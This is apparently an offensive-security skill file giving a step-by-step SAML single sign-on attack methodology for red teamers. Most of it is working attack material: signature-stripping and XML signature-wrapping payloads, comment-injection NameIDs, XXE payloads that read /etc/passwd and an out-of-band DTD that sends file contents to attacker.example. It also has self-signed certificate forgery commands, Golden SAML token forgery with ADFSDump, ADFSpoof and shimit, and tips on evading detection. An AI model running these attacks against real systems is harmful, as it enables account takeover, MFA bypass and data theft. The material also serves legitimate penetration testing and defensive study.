---
name: offensive-saml
description: "SAML 2.0 / SSO attack methodology for penetration testers and red teamers. Covers SAML Response/Assertion structure and flow (SP-initiated vs IdP-initiated, HTTP-Redirect vs HTTP-POST binding), XML Signature Wrapping (XSW1-XSW8), signature exclusion/stripping, signature-validation-disabled and unsigned-assertion acceptance, XML comment injection / canonicalization truncation (user@example.com vs user@example.<!---->com, Duo advisory, CVE-2017-11427 family), XXE/DTD injection in SAML messages, recipient/audience/destination/InResponseTo confusion, assertion replay and missing NotOnOrAfter, RelayState open redirect, certificate and key confusion, and Golden SAML (stealing the ADFS token-signing private key to forge arbitrary assertions with shimit, ADFSDump, ADFSpoof). Tooling: Burp SAML Raider, SAMLRereplay, xmlsec1. Use when testing SAML single sign-on, federated authentication, SP/IdP integrations, ADFS, Shibboleth, Okta, Keycloak, OneLogin, or hunting authentication bypass and account takeover via SAML assertion manipulation."
---

# SAML / SSO Attacks

SAML (Security Assertion Markup Language) 2.0 is the XML-based federation protocol behind most enterprise single sign-on. The security of the entire trust relationship collapses to one question: *did the Service Provider correctly verify the XML signature over the exact bytes it then trusts for identity?* XML's flexibility — multiple elements with the same ID, comments inside text nodes, DTD processing, whitespace-sensitive canonicalization — gives attackers an enormous surface to make the signed bytes and the consumed bytes diverge. This skill is a focused methodology for that surface: wrapping, stripping, comment-truncation, XXE, replay/scope confusion, and the "crown jewel" Golden SAML forgery.

Treat every finding as full authentication bypass / account takeover until proven otherwise. A single accepted forged assertion typically means "log in as any user, including the administrator."

## Quick Workflow

1. **Capture a real SSO flow.** Proxy the browser (Burp + SAML Raider). Trigger login at the SP, follow the redirect to the IdP, authenticate, and capture the `SAMLResponse` POST back to the SP's ACS (Assertion Consumer Service) URL.
2. **Decode and map the message.** Base64-decode (POST binding) or inflate+Base64-decode (Redirect binding). Identify: is the signature on the `<Response>`, the `<Assertion>`, both, or neither? Note every `ID`, the `<ds:Reference URI="#...">` target, `Destination`, `Recipient`, `Audience`, `InResponseTo`, `NotOnOrAfter`, and the `NameID`.
3. **Test signature handling first.** Strip the signature. Remove the assertion signature but keep the response signature (and vice versa). Submit an unsigned assertion. If any is accepted, you are done.
4. **Run the XSW matrix (XSW1-XSW8).** Inject a forged assertion/response in each wrapping position relative to the `Signature`/`SignedInfo`/`Reference`. Change the `NameID` to a target user. SAML Raider automates all eight.
5. **Attack the canonical form.** Insert XML comments inside the `NameID` text (`admin<!---->@example.com`) to test comment-truncation (CVE-2017-11427 family). Try XXE/DTD if the parser resolves entities.
6. **Attack scope and replay.** Reuse a captured assertion (replay), change `Audience`/`Recipient`/`Destination`, drop `NotOnOrAfter`, and tamper `RelayState` for open redirect.
7. **If you hold the IdP host (ADFS), go for Golden SAML.** Extract the token-signing key and forge assertions offline — no credentials, no MFA, survives password resets.

---

## SAML Message Structure and Flow

### The two bindings

| Binding | Transport | Encoding | Where it appears |
|---|---|---|---|
| HTTP-Redirect | GET query string | DEFLATE → Base64 → URL-encode | AuthnRequest, sometimes LogoutRequest |
| HTTP-POST | HTML form auto-POST | Base64 only (no DEFLATE) | SAMLResponse to the ACS; most assertions |

Redirect-binding signatures sign the raw query string (`SAMLRequest`/`SAMLResponse` + `RelayState` + `SigAlg`) via the `Signature=` parameter, *not* an embedded `<ds:Signature>`. POST-binding signatures are embedded XML signatures (XML-DSig). This matters: the detached query-string signature and the embedded XML signature have completely different bypass classes.

### Decode a POST-binding response

```bash
# POST binding: plain Base64
echo 'PHNhbWxwOlJlc3BvbnNl...' | base64 -d | xmllint --format -

# Redirect binding: inflate first (raw DEFLATE, no zlib header)
echo 'fZJbc9...' | base64 -d | python3 -c "import sys,zlib; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read(), -15))" | xmllint --format -

# Re-encode after tampering (POST)
cat forged.xml | base64 -w0
```

### Anatomy of a signed Response

```xml
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                ID="_response123" InResponseTo="_req456"
                Destination="https://sp.example/acs" IssueInstant="2025-01-01T00:00:00Z">
  <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">https://idp.example/metadata</saml:Issuer>
  <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
    <ds:SignedInfo>
      <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
      <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
      <ds:Reference URI="#_response123">          <!-- what is actually signed -->
        <ds:Transforms>
          <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
          <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
        </ds:Transforms>
        <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
        <ds:DigestValue>BASE64_DIGEST</ds:DigestValue>
      </ds:Reference>
    </ds:SignedInfo>
    <ds:SignatureValue>BASE64_SIG</ds:SignatureValue>
    <ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIIC...</ds:X509Certificate></ds:X509Data></ds:KeyInfo>
  </ds:Signature>
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_assertion789" IssueInstant="2025-01-01T00:00:00Z">
    <saml:Issuer>https://idp.example/metadata</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">user@example.com</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData Recipient="https://sp.example/acs"
          NotOnOrAfter="2025-01-01T00:05:00Z" InResponseTo="_req456"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="2025-01-01T00:00:00Z" NotOnOrAfter="2025-01-01T00:05:00Z">
      <saml:AudienceRestriction><saml:Audience>https://sp.example/metadata</saml:Audience></saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="2025-01-01T00:00:00Z"/>
  </saml:Assertion>
</samlp:Response>
```

Key observation for everything below: the signature covers whatever `<ds:Reference URI="#...">` points at. If you can get the SP to *validate* the digest over `#_response123` (or `#_assertion789`) while *reading identity* from a different, attacker-controlled element with the same-or-different ID, you win.

---

## Signature Exclusion / Stripping

The simplest attack, and still shockingly common: remove the signature entirely and see if the SP falls open. This targets implementations that validate a signature *if present* but do not *require* one (CWE-347).

```bash
# 1. Strip the <ds:Signature> block, keep the assertion, change the NameID
xmllint --format response.xml \
  | sed '/<ds:Signature/,/<\/ds:Signature>/d' \
  | sed 's#user@example.com#admin@example.com#' > stripped.xml
base64 -w0 stripped.xml    # resubmit as SAMLResponse
```

Variants to test independently — many libraries sign the Response *or* the Assertion but validate only one path:

- Remove the **Response** signature, keep the **Assertion** signature, tamper fields *outside* the signed assertion (e.g. `Destination`, `InResponseTo`).
- Remove the **Assertion** signature, keep the **Response** signature, tamper fields *inside* the assertion (`NameID`, `Audience`).
- Remove **both** signatures and submit a fully unsigned assertion.
- Keep the signature element but blank the `<ds:SignatureValue>` or `<ds:DigestValue>` — some verifiers treat a malformed signature as "no signature to check."
- Send an empty/self-closed `<ds:Signature/>`.

The underlying defect: signature verification and identity consumption are decoupled, and verification is advisory. **The SP must enforce that the specific element it trusts for identity is covered by a valid signature from the configured IdP certificate.**

---

## XML Signature Wrapping (XSW1-XSW8)

XSW is the canonical SAML attack, formalized in Somorovsky et al., *"On Breaking SAML: Be Whoever You Want to Be"* (USENIX Security 2012). The idea: XML-DSig validates a digest over the element referenced by `URI="#id"`. XML parsing, by contrast, returns "the assertion" by position, by tag name, or by a *different* ID lookup. When the validator and the business logic disagree about *which* element is "the assertion," you place a legitimately-signed assertion somewhere the validator will check it, and a forged assertion somewhere the application will read it.

The eight variants differ in *where* the forged element is injected relative to the original signed element and its `Signature`/`SignedInfo`/`Reference`:

| Variant | Signed (original) element | Forged element placement | Trick |
|---|---|---|---|
| XSW1 | Response | forged Response wraps original; copy signature | Signature references original Response ID, logic reads forged root |
| XSW2 | Response | forged Response as sibling; detached signature | Same, with detached-signature handling |
| XSW3 | Assertion | forged Assertion as sibling *before* original | Evaluator reads first assertion, validator checks signed one |
| XSW4 | Assertion | forged Assertion wraps original (forged is parent) | Document order vs reference resolution |
| XSW5 | Assertion | forged Assertion after signature; original moved into it | Digest matches original, ID now on forged copy |
| XSW6 | Assertion | forged after signature, original inside `Object`/signature | Deep nesting confuses XPath selection |
| XSW7 | Assertion | forged inside `<Extensions>` (schema-permissive) | `Extensions` allows arbitrary children with same ID |
| XSW8 | Assertion | original moved into `<Object>`, forged takes its place | Legacy `Object` wrapping |

### Concrete XSW example (sibling-assertion, XSW3 style)

Original: signature references `#_assertion789`. Keep that element intact (its digest still validates). Add a *forged* assertion with a different ID and the attacker's chosen `NameID`, placed so the SP's "get the assertion" logic returns the forged one.

```xml
<samlp:Response ID="_response123">
  <saml:Assertion ID="_forged_evil">                 <!-- forged: read by app -->
    <saml:Issuer>https://idp.example/metadata</saml:Issuer>
    <saml:Subject>
      <saml:NameID>admin@example.com</saml:NameID>     <!-- target identity -->
    </saml:Subject>
    <saml:Conditions NotBefore="2000-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z">
      <saml:AudienceRestriction><saml:Audience>https://sp.example/metadata</saml:Audience></saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="2025-01-01T00:00:00Z"/>
  </saml:Assertion>

  <saml:Assertion ID="_assertion789">                 <!-- original: validated -->
    <ds:Signature>
      <ds:SignedInfo>
        <ds:Reference URI="#_assertion789"><ds:DigestValue>ORIGINAL_DIGEST</ds:DigestValue></ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue>ORIGINAL_SIG</ds:SignatureValue>
    </ds:Signature>
    <saml:Subject><saml:NameID>user@example.com</saml:NameID></saml:Subject>
    <!-- unchanged original content so the digest still matches -->
  </saml:Assertion>
</samlp:Response>
```

### Automate it with SAML Raider

Burp SAML Raider is the field standard. Capture the `SAMLResponse` in Burp, send to the SAML Raider tab, then:

1. Edit the `NameID` / attributes to your target user.
2. Click one of the eight **XSW** buttons to auto-restructure the document.
3. Forward the request; repeat across all eight. Also use "Remove Signatures" and "(Re)Sign Assertion"/"(Re)Sign Message" with a self-signed cert you generate in the Certificates tab (for the certificate-confusion test below).

```bash
# Manual signing / verification harness with xmlsec1 (useful outside Burp)
# Verify what the SP should accept:
xmlsec1 --verify --pubkey-cert-pem idp.crt --id-attr:ID Assertion response.xml

# Re-sign a tampered doc with YOUR key (tests whether SP pins the IdP cert at all):
xmlsec1 --sign --privkey-pem attacker.key,attacker.crt --id-attr:ID Assertion forged.xml
```

If the SP accepts an assertion signed by *your* self-signed certificate, it is not pinning the IdP's key (certificate confusion — see below).

---

## XML Comment Injection / Canonicalization Truncation

Disclosed by Duo Labs (Kelby Ludwig, 2018) across many SAML libraries — the **CVE-2017-11427 family**. XML canonicalization and text-node handling can differ between the signature-validation layer and the identity-extraction layer. If one layer treats `<!---->` as a node boundary and reads only the *first* text node while the signature covers the *whole* canonicalized text, you can register as `user@evilcorp.example` and authenticate as `user`.

The payload inserts a comment into the `NameID`:

```xml
<!-- Attacker controls an account "admin@attacker.example". Inject a comment so that
     signature validation sees the full string but the app reads the truncated prefix. -->
<saml:NameID>admin@example.com<!---->.attacker.example</saml:NameID>
```

Depending on which direction the parser truncates:

```xml
<!-- Truncate-after-comment: app reads "admin@example.com" -->
<saml:NameID>admin@example.com<!---->.evil</saml:NameID>

<!-- Truncate-before / first-text-node only: app reads "admin" -->
<saml:NameID>admin<!---->@attacker.example</saml:NameID>
```

Methodology:

1. Register / control an account whose identifier *contains* the victim's identifier as a substring (e.g. you own `victim@example.com.attacker.example`, target is `victim@example.com`).
2. Capture your own legitimately signed assertion for *your* account.
3. Insert `<!---->` at the truncation boundary inside `<saml:NameID>` without changing any other signed bytes — the comment is ignored by exclusive c14n, so the signature still validates.
4. Submit. If the SP logs you in as the truncated identity, it is vulnerable.

Affected real implementations (same Duo disclosure wave):

| CVE | Component |
|---|---|
| CVE-2017-11427 | OneLogin `python-saml` |
| CVE-2017-11428 | OneLogin `ruby-saml` |
| CVE-2017-11429 | `omniauth-saml` |
| CVE-2017-11430 | `onelogin/php-saml` (auth bypass chain) |
| CVE-2018-0489 | Shibboleth Service Provider (`xmltooling`) |
| CVE-2018-7340 | Duo Network Gateway |

A later, closely-related primitive is **CVE-2024-45409** (`ruby-saml` / affecting GitHub Enterprise Server SAML SSO), where signature verification could be bypassed to forge assertions — a reminder that this class is not historical.

---

## XXE / DTD Injection in SAML Messages

A `SAMLResponse` is attacker-supplied XML parsed server-side. If the SP's XML parser resolves external entities or DTDs, standard XXE applies — file read, SSRF, or out-of-band exfiltration — *before* or *independent of* signature checks. Shibboleth and several Java stacks have historically been affected by XML-parsing issues.

```xml
<?xml version="1.0"?>
<!DOCTYPE samlp:Response [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">&xxe;</saml:Issuer>
  ...
</samlp:Response>
```

Blind / OOB variant with an external DTD you host at `http://attacker.example/evil.dtd`:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % ext SYSTEM "http://attacker.example/evil.dtd">
  %ext;
]>
<samlp:Response>...</samlp:Response>
```

```xml
<!-- evil.dtd (hosted by attacker) -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example/?x=%file;'>">
%eval;
%exfil;
```

Also test **billion-laughs / entity-expansion DoS** and **SSRF via DTD** against internal services. Place entities in fields the SP echoes into errors or logs (`Issuer`, attribute values) to confirm resolution. See the `offensive-xxe` skill for parser-specific payloads and filter bypasses.

---

## Recipient / Audience / Destination / InResponseTo Confusion and Replay

Even with valid signatures, SPs must enforce *scope* and *freshness*. Failures here enable cross-SP assertion reuse and replay.

- **Audience confusion:** capture a valid assertion minted for `sp-a.example` and replay it to `sp-b.example`. If `sp-b` does not enforce `<saml:Audience>` matching its own entity ID, the assertion is accepted out of scope.
- **Recipient / Destination mismatch:** change `Recipient`/`Destination` to a different ACS. If unchecked (or if removing the attribute is tolerated), the assertion can be redirected.
- **InResponseTo confusion:** IdP-initiated flows have no `InResponseTo`. If an SP accepts an unsolicited (IdP-initiated) response on an endpoint meant only for SP-initiated flows, you can inject assertions without a prior `AuthnRequest`. Conversely, mismatched/absent `InResponseTo` on an SP-initiated endpoint enables CSRF-style login.
- **Replay / missing NotOnOrAfter:** resend the same assertion twice. A compliant SP caches the assertion `ID` and rejects reuse within the validity window; many do not. If `NotOnOrAfter` (in `<Conditions>` and `<SubjectConfirmationData>`) is absent or far in the future, the assertion is a long-lived bearer token.

```bash
# Replay test: submit an unmodified, previously-valid SAMLResponse again after login.
curl -s -X POST https://sp.example/acs -d "SAMLResponse=$(base64 -w0 captured.xml)" -d "RelayState=/dashboard"
# Second identical submission accepted == no replay cache (ID not tracked).
```

```xml
<!-- Scope-widening tamper (only valid if Conditions is unsigned/strippable) -->
<saml:Conditions NotBefore="2000-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z">
  <saml:AudienceRestriction>
    <saml:Audience>https://sp-a.example/metadata</saml:Audience>
    <saml:Audience>https://sp-b.example/metadata</saml:Audience>   <!-- added second SP -->
  </saml:AudienceRestriction>
</saml:Conditions>
```

---

## RelayState Open Redirect

`RelayState` is the opaque round-trip parameter that tells the SP where to send the user after login. It is frequently a raw return URL and frequently unvalidated — a textbook open redirect, useful for phishing and for stealing follow-on tokens.

```http
POST /acs HTTP/1.1
Host: sp.example
Content-Type: application/x-www-form-urlencoded

SAMLResponse=<base64>&RelayState=https://attacker.example/phish
```

Test the usual open-redirect bypasses on the value: `//attacker.example`, `https:attacker.example`, `https://sp.example.attacker.example`, `/\attacker.example`, backslash and whitespace tricks, and `javascript:` where the value is reflected into a client-side redirect. Note that `RelayState` is signed in the Redirect binding but typically *not* in the POST binding, so POST-binding ACS endpoints are the prime target. See `offensive-open-redirect` for the full bypass matrix.

---

## Certificate / Key Confusion

The SP must trust exactly the IdP's configured signing certificate — not "any certificate embedded in the message."

- **Self-signed-cert acceptance:** re-sign your tampered assertion with a self-signed cert and embed it in `<ds:KeyInfo><ds:X509Certificate>`. If accepted, the SP trusts the in-message `KeyInfo` instead of a pinned cert (full forgery).
- **KeyInfo substitution:** swap `<ds:KeyInfo>` for your key while keeping a valid-looking structure.
- **Key- to-cert confusion / wrong trust anchor:** multi-IdP SPs that select the verification key by `Issuer` can be tricked by changing `<saml:Issuer>` to a different, attacker-controlled federation entry.
- **Expired / revoked cert tolerance:** some SPs skip validity/CRL checks on the signing cert.

```bash
# Generate a self-signed signing cert for the certificate-confusion test (do this in SAML Raider's Certificates tab too)
openssl req -x509 -newkey rsa:2048 -keyout attacker.key -out attacker.crt -days 7 -nodes -subj "/CN=idp.example"
xmlsec1 --sign --privkey-pem attacker.key,attacker.crt --id-attr:ID Assertion forged.xml > signed_by_attacker.xml
```

---

## Golden SAML

Golden SAML (CyberArk, Shaked Reiner, 2017) is the SAML analogue of Golden Ticket: steal the IdP's **token-signing private key** and forge arbitrary, perfectly-valid assertions offline. Because the assertions are genuinely signed by the IdP key, every downstream SP accepts them. It requires no user credentials, bypasses MFA, and **survives password resets and account disablement** — it is a persistence and privilege-escalation technique, not an initial-access one. You must already have the IdP (classically on-prem ADFS) host or its key.

Primitives (ADFS):

```powershell
# 1) On a compromised ADFS server, the token-signing key is protected by DKM in AD.
#    ADFSDump extracts the encrypted signing key material and the DKM decryption key.
.\ADFSDump.exe

# 2) ADFSpoof turns the dumped key into forged, signed SAML tokens for a chosen user.
python3 ADFSpoof.py -b EncryptedPfx.bin DKMkey.bin saml2 \
  --endpoint https://sp.example/acs \
  --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:persistent \
  --nameid "admin@example.com" --rpidentifier https://sp.example/metadata \
  --assertions '<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"><AttributeValue>admin@example.com</AttributeValue></Attribute>'
```

```bash
# Cloud/O365 path: shimit uses a stolen ADFS token-signing private key (PFX) to mint
# a SAML token and inject it into a session, impersonating any user to federated SPs.
python3 shimit.py -idp http://idp.example/adfs/services/trust \
  -pk tokensigning.key -c tokensigning.crt \
  -u administrator -n "ADMIN_SID" \
  -g "GROUP_SID_1,GROUP_SID_2"
```

Related extraction tooling: Mimikatz (`ADFS` / DPAPI paths for the signing key), `Get-AdfsProperties` for DKM container location, and reading the AD DKM master key with domain admin. For Entra/AADConnect hybrids, compromise of the federation trust or the AADConnect sync account is the equivalent pivot. Forged assertions should mirror a real one's attribute set (UPN, ImmutableID/`persistent` NameID) so they pass SP-side attribute mapping.

---

## Detection / Defender View

What defenders see, and the evasions that matter to you as the operator:

| Signal | What it catches | Evasion / note |
|---|---|---|
| SP logs: assertions accepted with duplicate/odd IDs, multiple `<Assertion>` nodes | XSW attempts | Minimize structural noise; one forged + one original element |
| IdP sign-in logs vs SP sessions mismatch | Golden SAML (no corresponding IdP auth event) ✓ | This is the strongest Golden SAML detection — there is no IdP login for the forged token |
| `NameID` containing `<!---->` / comments in SP logs | Comment-injection ⚠ | Some parsers strip comments before logging, hiding it |
| ACS receiving unsolicited responses (no prior AuthnRequest / `InResponseTo`) | IdP-initiated injection | Legitimate in some deployments — context-dependent |
| Assertion `ID` replay within validity window | Replay | Defeated only if SP keeps a replay cache |
| Signing cert fingerprint != pinned IdP cert | Cert confusion ✓ | Strong signal; relies on SP logging the actual verifying key |
| 4769/1200/1202 ADFS + Event 307/510 token issuance anomalies | ADFS key abuse | Golden SAML forges *outside* ADFS, so issuance events are absent |

Core defender mitigations (and the exact gaps you are testing for):

- **Require signatures on BOTH the Response and the Assertion**, and verify that the *specific* element consumed for identity is the one covered by a valid signature. This single control kills most XSW and all stripping.
- Use schema validation and a **hardened, canonicalization-correct XML library**; disable DTD/external-entity resolution (kills XXE).
- Resolve signature references by **secure ID resolution** (absolute XPath to the signed element, reject documents with duplicate IDs).
- **Pin the IdP signing certificate**; ignore in-message `KeyInfo` as a trust source.
- Enforce `Audience`, `Recipient`, `Destination`, `InResponseTo`, `NotBefore`/`NotOnOrAfter`, and an **assertion-ID replay cache**.
- Short assertion validity (minutes), clock-skew bounded.
- Protect the ADFS token-signing key (HSM, tiered admin, monitor DKM access); alert on SP sessions without matching IdP auth.

---

## Engagement Cheatsheet

```bash
# 0. Decode captured SAMLResponse
echo "$SAMLRESP" | base64 -d | xmllint --format - > resp.xml          # POST binding
# (Redirect) echo "$SAMLREQ" | base64 -d | python3 -c "import sys,zlib;sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read(),-15))"

# 1. Signature stripping
sed '/<ds:Signature/,/<\/ds:Signature>/d' resp.xml | sed 's/user@example.com/admin@example.com/' | base64 -w0   # resubmit

# 2. XSW1-XSW8  -> Burp SAML Raider: edit NameID, click each XSW button, forward
# 3. Comment injection
#    <saml:NameID>admin@example.com<!---->.attacker.example</saml:NameID>  (keep all other signed bytes intact)
# 4. XXE
#    <!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> ... <saml:Issuer>&xxe;</saml:Issuer>
# 5. Cert confusion
openssl req -x509 -newkey rsa:2048 -keyout a.key -out a.crt -days 7 -nodes -subj "/CN=idp.example"
xmlsec1 --sign --privkey-pem a.key,a.crt --id-attr:ID Assertion forged.xml | base64 -w0   # resubmit

# 6. Scope / replay
curl -s -X POST https://sp.example/acs -d "SAMLResponse=$(base64 -w0 captured.xml)" -d "RelayState=/dashboard"   # send twice
# tamper Audience/Recipient/Destination; drop NotOnOrAfter

# 7. RelayState open redirect
# RelayState=https://attacker.example  // //attacker.example  // https:attacker.example

# 8. Golden SAML (post-compromise of ADFS host)
#    ADFSDump -> ADFSpoof (forge SAML)   |   shimit (inject with stolen token-signing PFX)
```

Decision order in the field: **strip → wrap (XSW) → comment → cert-confusion → scope/replay → RelayState → XXE**, escalating to **Golden SAML** only once you hold the IdP. Stop at the first full bypass and document the exact message that was accepted.

---

## Key References

- Somorovsky, Mayer, Schwenk, Kampmann, Jensen — *On Breaking SAML: Be Whoever You Want to Be* — USENIX Security 2012 (origin of XSW1-XSW8): https://www.usenix.org/conference/usenixsecurity12/technical-sessions/presentation/somorovsky
- Duo Labs (Kelby Ludwig) — *Duo Finds SAML Vulnerabilities Affecting Multiple Implementations* (comment-injection / canonicalization truncation): https://duo.com/blog/duo-finds-saml-vulnerabilities-affecting-multiple-implementations
- CyberArk (Shaked Reiner) — *Golden SAML: Newly Discovered Attack Technique Forges Authentication to Cloud Apps*: https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps
- OWASP — *SAML Security Cheat Sheet*: https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html
- CWE-347 — Improper Verification of Cryptographic Signature: https://cwe.mitre.org/data/definitions/347.html
- MITRE ATT&CK — T1606.002 Forge Web Credentials: SAML Tokens (Golden SAML): https://attack.mitre.org/techniques/T1606/002/
- Burp SAML Raider (XSW automation, signing, cert management): https://github.com/portswigger/saml-raider
- shimit (CyberArk — Golden SAML exploitation): https://github.com/cyberark/shimit
- ADFSDump / ADFSpoof (Mandiant/FireEye — Doug Bienstock, Austin Baker): https://github.com/fireeye/ADFSpoof
- xmlsec1 (command-line XML-DSig signing/verification): https://www.aleksey.com/xmlsec/
- CVE-2017-11427 (python-saml), CVE-2017-11428 (ruby-saml), CVE-2017-11429 (omniauth-saml), CVE-2017-11430 (php-saml), CVE-2018-0489 (Shibboleth SP), CVE-2018-7340 (Duo Network Gateway) — SAML comment-injection family
- CVE-2024-45409 — ruby-saml signature-verification bypass (SAML SSO forgery; GitHub Enterprise Server impact): https://nvd.nist.gov/vuln/detail/CVE-2024-45409
- Source / related library skills: `offensive-xxe`, `offensive-open-redirect`, `offensive-jwt`, `offensive-oauth`
